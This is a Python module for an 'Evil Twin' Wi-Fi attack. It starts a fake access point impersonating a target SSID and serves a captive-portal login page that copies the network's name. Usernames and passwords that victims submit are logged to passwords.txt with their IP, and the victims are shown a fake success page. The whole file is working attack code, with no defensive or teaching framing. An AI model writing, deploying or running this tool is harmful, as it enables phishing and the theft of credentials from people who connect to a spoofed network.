#!/usr/bin/env python3

import os
import sys
import time
import subprocess
import threading
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
from pathlib import Path

# Global variables
http_server = None
server_thread = None
running = False
target_ssid = None
cleanup_done = False  # Prevent double cleanup

# HTTP Handler Class (kept as class since BaseHTTPRequestHandler requires it)
class CaptivePortalHandler(BaseHTTPRequestHandler):
    """HTTP handler for captive portal"""
    
    def log_message(self, format, *args):
        """Suppress HTTP server logs"""
        pass
    
    def do_GET(self):
        """Serve the login page"""
        # Check if custom HTML exists
        portal_html_path = "captive_portal/portal/index.html"
        
        if os.path.exists(portal_html_path):
            # Read and modify the template
            with open(portal_html_path, 'r') as f:
                html = f.read()
            # Replace SSID placeholder
            html = html.replace('{{SSID}}', target_ssid)
        else:
            # Use default HTML
            html = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>{target_ssid} - Login</title>
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <style>
                    body {{
                        font-family: Arial, sans-serif;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                        margin: 0;
                        background: #f0f0f0;
                    }}
                    .login-container {{
                        background: white;
                        padding: 40px;
                        border-radius: 10px;
                        box-shadow: 0 0 20px rgba(0,0,0,0.1);
                        width: 350px;
                    }}
                    h2 {{
                        text-align: center;
                        color: #333;
                        margin-bottom: 30px;
                    }}
                    input {{
                        width: 100%;
                        padding: 12px;
                        margin: 10px 0;
                        border: 1px solid #ddd;
                        border-radius: 5px;
                        box-sizing: border-box;
                        font-size: 14px;
                    }}
                    button {{
                        width: 100%;
                        padding: 12px;
                        background: #4CAF50;
                        color: white;
                        border: none;
                        border-radius: 5px;
                        cursor: pointer;
                        font-size: 16px;
                        margin-top: 20px;
                    }}
                    button:hover {{
                        background: #45a049;
                    }}
                    .info {{
                        text-align: center;
                        color: #666;
                        font-size: 12px;
                        margin-top: 20px;
                    }}
                </style>
            </head>
            <body>
                <div class="login-container">
                    <h2>{target_ssid}</h2>
                    <p style="text-align: center; color: #666;">Please sign in to continue</p>
                    <form method="POST" action="/login">
                        <input type="text" name="username" placeholder="Username or Email" required autofocus>
                        <input type="password" name="password" placeholder="Password" required>
                        <button type="submit">Sign In</button>
                    </form>
                    <div class="info">
                        By signing in, you agree to the terms of service
                    </div>
                </div>
            </body>
            </html>
            """
        
        # Send response
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def do_POST(self):
        """Capture credentials from POST request"""
        if self.path == '/login':
            # Parse POST data
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            params = parse_qs(post_data)
            
            username = params.get('username', [''])[0]
            password = params.get('password', [''])[0]
            
            if username and password:
                # Log credentials
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                client_ip = self.client_address[0]
                
                log_entry = f"[{timestamp}] SSID: {target_ssid} | IP: {client_ip} | Username: {username} | Password: {password}\n"
                
                # Save to passwords.txt
                with open('passwords.txt', 'a') as f:
                    f.write(log_entry)
                
                # Print to console
                print(f"\n[CAPTURED CREDENTIALS]")
                print(f"  SSID: {target_ssid}")
                print(f"  Username: {username}")
                print(f"  Password: {password}")
                print(f"  From IP: {client_ip}")
                print("")
            
            # Send fake success response
            response = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Connected</title>
                <meta http-equiv="refresh" content="3;url=/">
                <style>
                    body {{
                        font-family: Arial, sans-serif;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                        margin: 0;
                        background: #f0f0f0;
                    }}
                    .message {{
                        text-align: center;
                        padding: 40px;
                        background: white;
                        border-radius: 10px;
                        box-shadow: 0 0 20px rgba(0,0,0,0.1);
                    }}
                    h2 {{ color: #4CAF50; }}
                </style>
            </head>
            <body>
                <div class="message">
                    <h2>✓ Authentication Successful</h2>
                    <p>You are now connected to {target_ssid}</p>
                    <p style="color: #666;">Redirecting...</p>
                </div>
            </body>
            </html>
            """
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(response.encode())

# Functions (not in a class)

def check_requirements():
    """Check if required files and tools exist"""
    # Check for bash scripts
    scripts = ['captive_portal/setup_ap.sh', 'captive_portal/teardown_ap.sh']
    for script in scripts:
        if not os.path.exists(script):
            print(f"[ERROR] Missing script: {script}")
            return False
        # Make scripts executable
        os.chmod(script, 0o755)
    
    # Check for required tools
    tools = ['hostapd', 'dnsmasq', 'iptables']
    for tool in tools:
        result = subprocess.run(['which', tool], capture_output=True)
        if result.returncode != 0:
            print(f"[ERROR] Missing tool: {tool}")
            print(f"Install with: sudo apt-get install {tool}")
            return False
    
    # Create passwords.txt if it doesn't exist
    Path('passwords.txt').touch()
    
    return True

def start_web_server():
    """Start the captive portal web server"""
    global http_server, server_thread, running
    
    def run_server():
        global http_server
        try:
            # Bind to 10.0.0.1:80
            http_server = HTTPServer(('10.0.0.1', 80), CaptivePortalHandler)
            print("[✓] Captive portal web server started on 10.0.0.1:80")
            
            while running:
                http_server.handle_request()
                
        except OSError as e:
            if 'Address already in use' in str(e):
                print("[ERROR] Port 80 is already in use")
                print("[TIP] Try: sudo fuser -k 80/tcp")
            else:
                print(f"[ERROR] Web server error: {e}")
        except Exception as e:
            if running:  # Only show error if we're still supposed to be running
                print(f"[ERROR] Web server error: {e}")
    
    print("[*] Starting captive portal web server...")
    running = True
    server_thread = threading.Thread(target=run_server, daemon=True)
    server_thread.start()
    time.sleep(1)  # Give server time to start

def stop_web_server():
    """Stop the web server"""
    global running, http_server
    
    running = False
    if http_server:
        try:
            http_server.shutdown()
        except:
            pass
    
    # Kill any process on port 80
    subprocess.run(['sudo', 'fuser', '-k', '80/tcp'], 
                  stderr=subprocess.DEVNULL)

def run_setup_script(ssid, channel):
    """Run the bash setup script for AP"""
    # Always use wlan0 for AP
    ap_interface = "wlan0"
    
    print(f"[*] Setting up fake AP on {ap_interface}...")
    setup_script = "captive_portal/setup_ap.sh"
    
    # Run setup script
    result = subprocess.run(
        ['sudo', 'bash', setup_script, ap_interface, ssid, str(channel)],
        capture_output=False  # Show script output
    )
    
    # Give AP time to initialize
    time.sleep(2)
    
    # Verify AP is running
    hostapd_check = subprocess.run(['pgrep', 'hostapd'], capture_output=True)
    dnsmasq_check = subprocess.run(['pgrep', 'dnsmasq'], capture_output=True)
    
    if hostapd_check.returncode != 0 or dnsmasq_check.returncode != 0:
        print("\n[ERROR] Failed to start access point services")
        if hostapd_check.returncode != 0:
            print("  - hostapd is not running")
        if dnsmasq_check.returncode != 0:
            print("  - dnsmasq is not running")
        return False
    
    return True

def teardown_evil_twin():
    """Stop Evil Twin and restore system - can be called multiple times safely"""
    global cleanup_done, running
    
    # Prevent double cleanup
    if cleanup_done:
        return
    
    cleanup_done = True
    running = False
    
    print("\n[*] Cleaning up and restoring system...")
    
    # Stop web server
    try:
        stop_web_server()
    except:
        pass
    
    # Run teardown script
    teardown_script = "captive_portal/teardown_ap.sh"
    
    if os.path.exists(teardown_script):
        print("[*] Running system restore script...")
        subprocess.run(['sudo', 'bash', teardown_script])
    else:
        print("[WARNING] Teardown script not found, doing basic cleanup...")
        subprocess.run(['sudo', 'killall', 'hostapd'], stderr=subprocess.DEVNULL)
        subprocess.run(['sudo', 'killall', 'dnsmasq'], stderr=subprocess.DEVNULL)
        subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'])
    
    print("[✓] System restored to normal")

def setup_evil_twin(monitor_iface, ssid, channel):
    """Setup Evil Twin with fake AP and captive portal - with guaranteed cleanup"""
    global target_ssid, cleanup_done
    
    # Reset cleanup flag for new attack
    cleanup_done = False
    target_ssid = ssid
    
    try:
        print(f"\n{'='*60}")
        print(f"    EVIL TWIN ATTACK - {ssid}")
        print(f"{'='*60}\n")
        
        # Check requirements
        if not check_requirements():
            return False
        
        # Note about interface usage
        print(f"[*] Using wlan0 (built-in NIC) for fake AP")
        print(f"[*] Monitor interface: {monitor_iface}")
        
        if monitor_iface == "wlan0" or monitor_iface == "wlan0mon":
            print("\n[WARNING] Monitor mode is on wlan0!")
            print("[!] This may cause conflicts. Ensure you're using a different adapter for monitoring.")
            print("[!] Continuing anyway...\n")
        
        # Run setup script (always uses wlan0)
        if not run_setup_script(ssid, channel):
            print("[ERROR] Failed to setup access point")
            return False
        
        # Start web server for captive portal
        start_web_server()
        
        print(f"\n{'='*60}")
        print(f"[✓] Evil Twin '{ssid}' is active on wlan0!")
        print(f"[✓] Captive portal ready on 10.0.0.1")
        print(f"[*] Waiting for victims to connect...")
        print(f"[*] Credentials will be saved to: passwords.txt")
        print(f"{'='*60}\n")
        
        return True
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        return False
        
    except Exception as e:
        print(f"\n[ERROR] Unexpected error: {e}")
        return False
        
    finally:
        # This ALWAYS runs, even if there's an error or Ctrl+C
        if not cleanup_done and running:
            teardown_evil_twin()

def stop_evil_twin():
    """Wrapper function to stop Evil Twin"""
    teardown_evil_twin()

def is_running():
    """Check if Evil Twin is running"""
    return running

def quick_start(monitor_iface, bssid, ssid, channel):
    """Quick start function for main script integration"""
    # Note: bssid parameter not used but kept for compatibility
    success = False
    try:
        success = setup_evil_twin(monitor_iface, ssid, channel)
        return success
    finally:
        # If setup failed, cleanup is already done in setup_evil_twin's finally block
        # This is just for safety
        if not success and not cleanup_done:
            teardown_evil_twin()

def ensure_cleanup():
    """Ensure cleanup happens when module is unloaded or script exits"""
    global running
    if running:
        teardown_evil_twin()

# Register cleanup when module is imported
import atexit
atexit.register(ensure_cleanup)
